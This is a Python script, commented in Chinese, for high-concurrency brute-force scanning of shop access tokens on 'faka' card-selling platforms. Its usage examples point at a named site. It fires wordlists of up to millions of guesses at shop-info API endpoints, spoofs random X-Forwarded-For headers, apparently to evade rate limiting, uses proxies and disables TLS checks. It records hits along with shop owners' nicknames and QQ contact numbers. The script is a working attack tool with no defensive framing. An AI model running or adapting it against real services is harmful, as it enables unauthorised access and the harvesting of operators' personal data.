#!/usr/bin/env python3
"""
aiohttp 高并发店铺 token 扫描（适合百万级字典）。

示例:
  python3 shop_token_scan_async.py -u https://s.sggyx.com -f /data/wordlists/faka/faka-tokens-combo.txt -c 200
  python3 shop_token_scan_async.py -u https://s.sggyx.com --tokens 888,666,xiaoy
"""
from __future__ import annotations

import argparse
import asyncio
import json
import time
from pathlib import Path
from typing import Any

import aiohttp

from faka_common import DEFAULT_UA, ensure_out, load_wordlist, log, random_xff_headers, resolve_proxy, save_hit

PLATFORMS = {
    "pyfaas": {
        "path": "/shopApi/Shop/info",
        "field": "token",
        "ok": lambda j: isinstance(j, dict) and j.get("code") == 1 and isinstance(j.get("data"), dict),
    },
    "acg": {
        "path": "/user/api/site/info",
        "field": None,
        "ok": lambda j: isinstance(j, dict) and j.get("code") == 200,
    },
}


async def probe_one(
    session: aiohttp.ClientSession,
    sem: asyncio.Semaphore,
    base: str,
    token: str,
    plat: dict,
    use_xff: bool,
) -> tuple[str, bool, Any]:
    url = base.rstrip("/") + plat["path"]
    headers = {"User-Agent": DEFAULT_UA, "Content-Type": "application/json"}
    if use_xff:
        headers.update(random_xff_headers())
    async with sem:
        try:
            if plat["field"]:
                async with session.post(url, json={plat["field"]: token}, headers=headers, ssl=False) as r:
                    try:
                        data = await r.json(content_type=None)
                    except Exception:
                        data = (await r.text())[:500]
            else:
                async with session.get(url, headers=headers, ssl=False) as r:
                    try:
                        data = await r.json(content_type=None)
                    except Exception:
                        data = (await r.text())[:500]
            ok = plat["ok"](data) if isinstance(data, dict) else False
            return token, ok, data
        except Exception as e:
            return token, False, str(e)


async def run_scan(args: argparse.Namespace) -> int:
    plat = PLATFORMS[args.platform]
    if args.tokens:
        tokens = [t.strip() for t in args.tokens.split(",") if t.strip()]
    else:
        tokens = list(load_wordlist(args.wordlist, offset=args.offset, limit=args.limit or None))

    proxy = resolve_proxy(args.proxy)
    connector = aiohttp.TCPConnector(limit=args.concurrency, ssl=False)
    timeout = aiohttp.ClientTimeout(total=args.timeout)
    session_kwargs: dict = {"connector": connector, "timeout": timeout}
    if proxy:
        session_kwargs["trust_env"] = False

    sem = asyncio.Semaphore(args.concurrency)
    hits = 0
    done = 0
    start = time.time()

    async with aiohttp.ClientSession(**session_kwargs) as session:
        tasks = [
            probe_one(session, sem, args.url, tok, plat, args.xff)
            for tok in tokens
        ]
        for coro in asyncio.as_completed(tasks):
            token, ok, data = await coro
            done += 1
            if ok:
                hits += 1
                brief = data.get("data") if isinstance(data, dict) else data
                if isinstance(brief, dict):
                    brief = {k: brief.get(k) for k in ("nickname", "link", "sell_count", "contact_qq", "shop_name", "title")}
                save_hit(Path(args.out), "shop_token", {"url": args.url, "token": token, "data": brief})
                log(f"[+] HIT {token} -> {json.dumps(brief, ensure_ascii=False)[:200]}")
            if done % 2000 == 0:
                log(f"  progress {done:,}/{len(tokens):,} hits={hits}")

    log(f"完成: hits={hits} elapsed={time.time()-start:.1f}s -> {args.out}")
    return hits


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="aiohttp 高并发 token 扫描")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-f", "--wordlist", default="/data/wordlists/faka/faka-tokens-combo.txt")
    ap.add_argument("--tokens", default="")
    ap.add_argument("--platform", choices=PLATFORMS.keys(), default="pyfaas")
    ap.add_argument("-c", "--concurrency", type=int, default=100)
    ap.add_argument("--offset", type=int, default=0)
    ap.add_argument("--limit", type=int, default=0)
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--proxy", default="auto")
    ap.add_argument("--xff", action="store_true")
    ap.add_argument("--out", default="/data/tools/faka/out/shop_tokens_async.jsonl")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    ensure_out(args.out)
    log(f"扫描 {args.url} | platform={args.platform} | concurrency={args.concurrency}")
    asyncio.run(run_scan(args))


if __name__ == "__main__":
    main()
